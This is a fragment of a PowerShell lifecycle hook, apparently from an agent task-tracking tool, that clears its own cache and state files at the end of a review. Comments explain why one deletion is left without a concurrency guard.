# final hook in the lifecycle (W1095 mirrors the bash after_review cleanup).
# after_goal piggy-backs on after_review's lifecycle when present, so this
# gate intentionally stays on $HookName == 'after_review'.
if ($HookName -eq 'after_review') {
    # (W1453) Keep the env cache when after_goal rode this response — the
    # agent still needs GOAL_ID from it for the follow-up
    # PATCH /api/tasks/:goal_id/after_goal. The next claim rewrites the cache.
    # (D289) THE ONE ENV-CACHE MUTATION THAT DOES NOT GO THROUGH THE GUARD, and
    # it is named here rather than left as a silent exception, because D289's
    # own reasoning ("an unguarded Remove-Item discards a concurrent write more
    # completely than any rewrite does") reaches it verbatim.
    #
    # Left unguarded deliberately. What it produces is an ABSENT cache, not an
    # older task's identity, so it is not the reversion vector the defect is
    # about: both cache-TASK_ID consumers no-op when TASK_ID is unset, and a
    # claim landing concurrently carries its own compare-and-swap, so it either
    # commits after this delete or is refused - never silently reverted. This is
    # also the lifecycle END of a task, where a cache is meant to stop existing.
    # A guard here would have to answer "unchanged since WHAT read?", and this
    # site performs no read to compare against.
    if (-not $afterGoalRouted) {
        Remove-Item -Force $EnvCache -ErrorAction SilentlyContinue
    }
    Remove-Item -Force (Join-Path $ProjectDir '.stride-changed-files.json') -ErrorAction SilentlyContinue
    Remove-Item -Force (Join-Path $ProjectDir '.stride-diff-upload-state') -ErrorAction SilentlyContinue
    Remove-Item -Force (Join-Path $ProjectDir '.stride-dirty-baseline') -ErrorAction SilentlyContinue
}

# (D238) The one and only stdout write on the success path, after after_goal
# routing has had its chance to contribute a second section.
Emit-HookStdout

exit 0
